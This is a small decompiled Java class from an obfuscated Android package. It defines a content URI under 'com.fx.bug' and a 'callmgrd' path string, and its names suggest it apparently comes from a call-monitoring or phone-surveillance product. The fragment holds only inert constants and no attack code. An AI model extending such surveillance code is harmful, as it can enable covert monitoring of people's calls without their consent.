package com.vvt.callmanager.ref;

import android.net.Uri;
import com.vvt.m.b;

public class c
{
  public static final String a;
  public static final Uri b = Uri.parse("content://com.fx.bug/callmgr_startup_finish");
  
  static
  {
    Object[] arrayOfObject = new Object[2];
    String str = b.c;
    arrayOfObject[0] = str;
    arrayOfObject[1] = "callmgrd";
    a = String.format("%s/%s", arrayOfObject);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callmanager/ref/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */